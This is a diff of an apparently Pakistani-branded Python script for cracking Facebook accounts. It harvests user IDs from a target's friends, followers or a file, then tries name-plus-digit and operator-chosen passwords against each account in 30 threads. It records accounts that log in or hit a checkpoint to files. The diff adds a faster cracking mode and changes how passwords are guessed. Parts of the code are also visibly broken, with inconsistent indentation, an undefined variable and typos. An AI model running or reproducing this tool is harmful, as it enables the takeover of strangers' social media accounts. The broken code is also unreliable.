@@ -16,10 +16,6 @@ try:
     os.mkdir('/sdcard/ids')
 except OSError:
     pass 
-try:
-    os.mkdir("/sdcard/ids/ex_ids")
-except OSError:
-    pass
 os.system("git pull")
 from requests.exceptions import ConnectionError
 bd=random.randint(2e7, 3e7)
@@ -35,12 +31,12 @@ logo = """
    ██████████  ██████████  ███   ███  ███ 
           ███  ███    ███  ███   ███  ███  
    ███    ███  ███    ███  ███   ███  ███  
-   ██████████  ███    ███  ███   ███  ███ \x1b[1;90mQUEEN
-\033[3m\033[1;97m══════════════════════════════════════════════
+   ██████████  ███    ███  ███   ███  ███ \033[7m\033[1;36mQUEEN
+\033[1;97m══════════════════════════════════════════════
  [✓] Owner   : Sania Zahra x Shiffa Khan
  [✓] Github  : https://github.com/Stylish-Queen   
  [✓] Facebook: Jam Shahrukh Official
- [✓] don't pheel bro :)
+ [✓] don't pheel me:) hatterz make me famous 
 ══════════════════════════════════════════════"""
 idh = []
 back = 0
@@ -90,7 +86,7 @@ def login_choice():
 	except IOError:
 		os.system("clear")
 		print(logo)
-		print("\t    \033[1;32mLOGIN MENU\033[0;97m")
+		print("\t    \033[7m\033[1;32mLOGIN MENU\033[0;97m")
 		print("══════════════════════════════════════════════")
 		print("[1] Login with token")
 		print("[2] Login with id/pass")
@@ -181,10 +177,11 @@ def menu():
 	print(logo)
 	print("\t    \033[7m\033[1;32mUser: "+name+"\033[0;97m")
 	print("══════════════════════════════════════════════")
-	print("[1] Crack with auto name pass")
-	print("[2] Crack with choice number pass")
-	print("[3] Create File")
-	print("[4] Extract Group Post Likes")
+	print("[1] Crack normal mode")
+	print("[2] Crack fast mode")
+	print("[3] Crack extra fast mode")
+	print("[4] Create File")
+	print("[5] Extract Group Post Likes")
 	print("══════════════════════════════════════════════")
 	menu_option()
 def menu_option():
@@ -194,8 +191,10 @@ def menu_option():
 	elif select =="2":
 		choice()
 	elif select =="3":
-		ex_id()
+		choice_jam()
 	elif select =="4":
+		ex_id()
+	elif select =="5":
 	        ex_post()
 	else:
 		print("")
@@ -214,7 +213,7 @@ def crack():
 		login_choice()
 	os.system("clear")
 	print(logo)
-	print("\t    \033[7m\033[1;32mAUTO PASS CLONING\033[0;97m")
+	print("\t    \033[7m\033[1;32mNORMAL CRACK MENU\033[0;97m")
 	print("══════════════════════════════════════════════")
 	print("[1] Crack public id")
 	print("[2] Crack followers")
@@ -230,8 +229,14 @@ def crack_select():
 	if select =="1":
 		os.system("clear")
 		print(logo)
-		print("\t    \033[7m\033[1;32mAUTO PASS PUBLIC CRACK\033[0;97m")
+		print("\t    \033[7m\033[1;32mCHOICE PASS PUBLIC CRACK\033[0;97m")
 		print("══════════════════════════════════════════════")
+		p1 = raw_input(' \033[1;92m[1]Name + digit: ')
+                p2 = raw_input(' \033[1;92m[2]Name + digit: ')
+                p3 = raw_input(' \033[1;92m[3]Name + digit: ')
+		pass4 = raw_input(" [4]Password: ")
+		pass5 = raw_input(" [5]Password: ")
+		pass6 = raw_input(" [6]Password: ")
 		idt = raw_input(" Input id: ")
 		try:
 			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
@@ -252,9 +257,14 @@ def crack_select():
 	elif select =="2":
 		os.system("clear")
 		print(logo)
-		print("\t    \033[7m\033[1;32mAUTO PASS CRACK FOLLOWERS\033[0;97m")
+		print("\t    \033[7m\033[1;32mCHOICE PASS CRACK FOLLOWERS\033[0;97m")
 		print("══════════════════════════════════════════════")
-		idt = raw_input(" Input id: ")
+		p1 = raw_input(' \033[1;92m[1]Name + digit: ')
+                p2 = raw_input(' \033[1;92m[2]Name + digit: ')
+                p3 = raw_input(' \033[1;92m[3]Name + digit: ')
+		pass4 = raw_input(" [4]Password: ")
+		pass5 = raw_input(" [5]Password: ")
+		pass6 = raw_input(" [6]Password: ")
 		try:
 			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
 			q = json.loads(r.text)
@@ -274,8 +284,14 @@ def crack_select():
 	elif select =="3":
 		os.system("clear")
 		print(logo)
-		print("\t    \033[7m\033[1;32mAUTO PASS FILE CRACK\033[0;97m")
+		print("\t    \033[7m\033[1;32mCHOICE PASS FILE CRACK\033[0;97m")
 		print("══════════════════════════════════════════════")
+		p1 = raw_input(' \033[1;92m[1]Name + digit: ')
+                p2 = raw_input(' \033[1;92m[2]Name + digit: ')
+                p3 = raw_input(' \033[1;92m[3]Name + digit: ')
+		pass4 = raw_input(" [4]Password: ")
+		pass5 = raw_input(" [5]Password: ")
+		pass6 = raw_input(" [6]Password: ")
 		try:
 			filelist = raw_input("[+] File : ")
 			for line in open(filelist , "r").readlines():
@@ -295,12 +311,12 @@ def crack_select():
 		crack_select()
 	print("Total IDs : "+str(len(id)))
 	print("The Process has started")
-	print("\033[3══════════════════════════════════════════════")
+	print("══════════════════════════════════════════════")
 	def main(arg):
 		user=arg
 		uid,name=user.split("|")
 		try:
-			pass1 = name+"12"
+			pass1 = name.lower() + p1
 			data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass1, headers=header).text
 			q = json.loads(data)
 			if "loc" in q:
@@ -317,7 +333,7 @@ def crack_select():
 					cp.close()
 					cps.append(uid+pass1)
 				else:
-					pass2 = name+"123"
+					pass2 = name.lower() + p2
 					data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass2, headers=header).text
 					q = json.loads(data)
 					if "loc" in q:
@@ -334,7 +350,7 @@ def crack_select():
 							cp.close()
 							cps.append(uid+pass2)
 						else:
-							pass3 = name+"1234"
+							pass3 = name.lower() + p3
 							data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass3, headers=header).text
 							q = json.loads(data)
 							if "loc" in q:
@@ -351,7 +367,6 @@ def crack_select():
 									cp.close()
 									cps.append(uid+pass3)
 								else:
-									pass4 = name+"12345"
 									data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass4, headers=header).text
 									q = json.loads(data)
 									if "loc" in q:
@@ -368,7 +383,6 @@ def crack_select():
 											cp.close()
 											cps.apppend(uid+pass4)
 										else:
-											pass5 = name+"786"
 											data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass5, headers=header).text
 											q = json.loads(data)
 											if "loc" in q:
@@ -385,7 +399,6 @@ def crack_select():
 													cp.close()
 													cps.append(uid+pass5)
 												else:
-													pass6 = name+"1122"
 													data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass6).text
 													q = json.loads(data)
 													if "loc" in q:
@@ -516,7 +529,7 @@ def choice():
 		login_choice()
 	os.system("clear")
 	print(logo)
-	print("\t    \033[7m\033[1;32mCHOICE PASS CRACK MENU\033[0;97m")
+	print("\t    \033[7m\033[1;32mMEDIUM CRACK MENU\033[0;97m")
 	print("══════════════════════════════════════════════")
 	print("[1] Crack public id")
 	print("[2] Crack followers")
@@ -534,10 +547,10 @@ def choice_select():
 		print(logo)
 		print("\t    \033[7m\033[1;32mCHOICE PASS PUBLIC CRACK\033[0;97m")
 		print("══════════════════════════════════════════════")
-		pass1 = raw_input(" Password: ")
-		pass2 = raw_input(" Password: ")
-		pass3 = raw_input(" Password: ")
-		pass4 = raw_input(" Password: ")
+		p1 = raw_input(' \033[1;92m[1]Name + digit: ')
+                p2 = raw_input(' \033[1;92m[2]Name + digit: ')
+		pass3 = raw_input(" [3]Password: ")
+		pass4 = raw_input(" [4]Password: ")
 		idt = raw_input(" Input id: ")
 		try:
 			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
@@ -560,10 +573,10 @@ def choice_select():
 		print(logo)
 		print("\t    \033[7m\033[1;32mCHOICE PASS CRACK FOLLOWERS\033[0;97m")
 		print("══════════════════════════════════════════════")
-		pass1 = raw_input(" Password: ")
-		pass2 = raw_input(" Password: ")
-		pass3 = raw_input(" Password: ")
-		pass4 = raw_input(" Password: ")
+		p1 = raw_input(' \033[1;92m[1]Name + digit: ')
+                p2 = raw_input(' \033[1;92m[2]Name + digit: ')
+		pass3 = raw_input(" [3]Password: ")
+		pass4 = raw_input(" [4]Password: ")
 		idt = raw_input(" Input id: ")
 		try:
 			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
@@ -586,10 +599,10 @@ def choice_select():
 		print(logo)
 		print("\t    \033[7m\033[1;32mCHOICE PASS FILE CRACK\033[0;97m")
 		print("══════════════════════════════════════════════")
-		pass1 = raw_input(" Password: ")
-		pass2 = raw_input(" Password: ")
-		pass3 = raw_input(" Password: ")
-		pass4 = raw_input(" Password: ")
+		p1 = raw_input(' \033[1;92m[1]Name + digit: ')
+                p2 = raw_input(' \033[1;92m[2]Name + digit: ')
+		pass3 = raw_input(" [3]Password: ")
+		pass4 = raw_input(" [4]Password: ")
 		filelist = raw_input(" Input file: ")
 		try:
 			for line in open(filelist , "r").readlines():
@@ -609,11 +622,12 @@ def choice_select():
 		choice_select()
 	print("Total IDs : "+str(len(id)))
 	print("The Process has started")
-	print("\033[3══════════════════════════════════════════════")
+	print("══════════════════════════════════════════════")
 	def main(arg):
 		user=arg
 		uid,name=user.split("|")
 		try:
+			pass1 = name.lower() + p1
 			data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass1, headers=header).text
 			q = json.loads(data)
 			if "loc" in q:
@@ -630,6 +644,7 @@ def choice_select():
 					cp.close()
 					cps.append(uid+pass1)
 				else:
+					pass2 = name.lower() + p2
 					data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass2, headers=header).text
 					q = json.loads(data)
 					if "loc" in q:
@@ -690,6 +705,156 @@ def choice_select():
 	print("══════════════════════════════════════════════")
 	raw_input(" Press enter to back")
 	choice()
+	
+def choice_jam():
+	global token
+	os.system("clear")
+	try:
+		token = open(".login.txt","r").read()
+	except IOError:
+		print("")
+		print("\t    \033[1;31mToken not found\033[0;97m")
+		time.sleep(1)
+		login_choice()
+	os.system("clear")
+	print(logo)
+	print("\t    \033[7m\033[1;32mFAST CRACK MENU\033[0;97m")
+	print("══════════════════════════════════════════════")
+	print("[1] Crack public id")
+	print("[2] Crack followers")
+	print("[3] Crack file")
+	print("[0] Back")
+	print("══════════════════════════════════════════════")
+	choice_select_jam()
+def choice_select_jam():
+	select = raw_input("\033[1;33mChoose option: \033[0;97m")
+	id=[]
+	oks=[]
+	cps=[]
+	if select =="1":
+		os.system("clear")
+		print(logo)
+		print("\t    \033[7m\033[1;32mCHOICE PASS PUBLIC CRACK\033[0;97m")
+		print("══════════════════════════════════════════════")
+		pass1 = raw_input(" [1]Password: ")
+		pass2 = raw_input(" [2]Password: ")
+		idt = raw_input(" Input id: ")
+		try:
+			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
+			q = json.loads(r.text)
+			print(" Cloning from : "+q["name"])
+		except KeyError:
+			print("\t    \033[1;31mLogged in id has checkpoint\033[0;97m")
+			print("")
+			raw_input(" Press enter to back")
+			choice_jam()
+		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token, headers=header)
+		z = json.loads(r.text)
+		for i in z["data"]:
+			uid = i["id"]
+			na = i["name"]
+			nm = na.rsplit(" ")[0]
+			id.append(uid+"|"+nm)
+	elif select =="2":
+		os.system("clear")
+		print(logo)
+		print("\t    \033[7m\033[1;32mCHOICE PASS CRACK FOLLOWERS\033[0;97m")
+		print("══════════════════════════════════════════════")
+		pass1 = raw_input(" [1]Password: ")
+		pass2 = raw_input(" [2]Password: ")
+		idt = raw_input(" Input id: ")
+		try:
+			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
+			q = json.loads(r.text)
+			print(" Cloning from: "+q["name"])
+		except KeyError:
+			print("\t    \033[1;31mLogged in id has checkpoint\033[0;97m")
+			print("══════════════════════════════════════════════")
+			raw_input(" Press enter to back")
+			choice_jam()
+		r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?access_token="+token+"&limit=999999", headers=header)
+		z = json.loads(r.text)
+		for i in z["data"]:
+			uid = i["id"]
+			na = i["name"]
+			nm = na.rsplit(" ")[0]
+			id.append(uid+"|"+nm)
+	elif select =="3":
+		os.system("clear")
+		print(logo)
+		print("\t    \033[7m\033[1;32mCHOICE PASS FILE CRACK\033[0;97m")
+		print("══════════════════════════════════════════════")
+		pass1 = raw_input(" [1]Password: ")
+		pass2 = raw_input(" [2]Password: ")
+		filelist = raw_input(" Input file: ")
+		try:
+			for line in open(filelist , "r").readlines():
+			    id.append(line.strip())
+		except (KeyError,IOError):
+			print("")
+			print("\t    \033[1;31mRequested file not found\033[0;97m")
+			print("══════════════════════════════════════════════")
+			raw_input(" Press enter to back ")
+			choice_jam()
+	elif select =="0":
+	    menu()
+	else:
+		print("")
+		print("\t    \033[1;31mSelect valid option\033[0;97m")
+		print("")
+		choice_select_jam()
+	print("Total IDs : "+str(len(id)))
+	print("The Process has started")
+	print("══════════════════════════════════════════════")
+	def main(arg):
+		user=arg
+		uid,name=user.split("|")
+		try:
+			data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass1, headers=header).text
+			q = json.loads(data)
+			if "loc" in q:
+				print("\033[1;92m[Sania-Ok] "+uid+" | "+pass1)
+				ok = open("/sdcard/ids/sdcard/ids/jam_ok.txt", "a")
+				ok.write(uid+" | "+pass1+"\n")
+				ok.close()
+				oks.append(uid+pass1)
+			else:
+				if "www.facebook.com" in q["error"]:
+					print("\033[1;90m[Shifa-Cp] "+uid+" | "+pass1)
+					cp = open("/sdcard/ids/jam_cp.txt","a")
+					cp.write(uid+" | "+pass1+"\n")
+					cp.close()
+					cps.append(uid+pass1)
+				else:
+					data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass2, headers=header).text
+					q = json.loads(data)
+					if "loc" in q:
+						print("\033[1;92m[Sania-Ok] "+uid+" | "+pass2)
+						ok = open("/sdcard/ids/jam_ok.txt", "a")
+						ok.write(uid+" | "+pass2+"\n")
+						ok.close()
+						oks.append(uid+pass2)
+					else:
+						if "www.facebook.com" in q["error"]:
+							print("\033[1;90m[Shifa-Cp] "+uid+" | "+pass2)
+							cp = open("/sdcard/ids/jam_cp.txt","a")
+							cp.write(uid+" | "+pass2+"\n")
+							cp.close()
+							cps.append(uid+pass2)
+
+																
+		except:
+			pass
+	
+	p = ThreadPool(30)
+	p.map(main,id)
+	print("══════════════════════════════════════════════")
+	print(" The process has completed")
+	print(" Total Ok/Cp:"+str(len(oks)))+"/"+str(len(cps))
+	print("══════════════════════════════════════════════")
+	raw_input(" Press enter to back")
+	choice_jam()
+	
 if __name__ == '__main__':
 	tlogin()
 
